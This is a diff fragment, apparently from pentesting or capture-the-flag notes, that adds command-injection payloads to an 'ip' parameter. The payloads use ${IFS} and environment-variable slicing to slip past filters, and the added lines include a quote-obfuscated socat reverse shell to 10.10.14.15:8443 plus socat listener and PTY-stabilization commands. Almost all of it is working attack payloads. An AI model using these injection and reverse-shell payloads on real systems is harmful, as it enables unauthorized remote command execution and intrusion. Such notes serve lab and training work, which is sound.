@@ -26,6 +26,17 @@ ip=127.0.0.1%0a${IFS}ls${IFS}${PATH:0:1}home
 echo ${LS_COLORS:10:1}
 ;
 ip=127.0.0.1${LS_COLORS:10:1}id
+
+%0a's'o'c'a't'${IFS}TCP4:10.10.14.15:8443${IFS}EXEC:bash
+```
+
+Stabilize socat shell 
+```bash
+socat TCP4:10.10.14.5:8443 EXEC:/bin/bash
+
+socat file:`tty`,raw,echo=0 tcp-listen:4443    <-- On our host
+
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.15:4443
 ```
 
 ```php
